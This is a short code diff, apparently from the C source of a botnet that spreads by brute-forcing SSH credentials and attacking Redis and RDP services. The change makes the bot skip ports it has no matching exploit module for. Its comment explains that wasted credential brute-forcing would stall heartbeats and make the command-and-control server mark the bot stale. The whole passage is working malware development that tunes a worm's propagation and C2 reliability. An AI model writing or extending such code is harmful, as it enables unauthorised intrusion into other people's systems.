@@ -2300,9 +2300,15 @@ int protocol_process_commands(notnet_bot_t *bot) {
                         case 6379: spread_ok = spread_redis(bot, host, port); break;
                         case 3389: spread_ok = spread_rdp(bot, host, port); break;
                         default:
-                            /* Unknown port: best-effort SSH brute (most common
-                             * service); the spreader logs the real outcome. */
-                            spread_ok = spread_ssh(bot, host, port); break;
+                            /* Unknown port: log and skip. Bruting a port that
+                             * answered as non-SSH (e.g. an HTTP service on 80)
+                             * burns the whole 475-credential pool at ~1s per
+                             * attempt against the banner timeout — ~8 minutes
+                             * blocking the single command loop, so heartbeats
+                             * stop and the C2 marks the bot stale. The CVE
+                             * modules above are the vector for such ports. */
+                            log_info("CMD: spread no vector for %s:%d (no CVE module matched)", host, port);
+                            spread_ok = -1; break;
                     }
                 }
                 if (spread_ok == 0) {
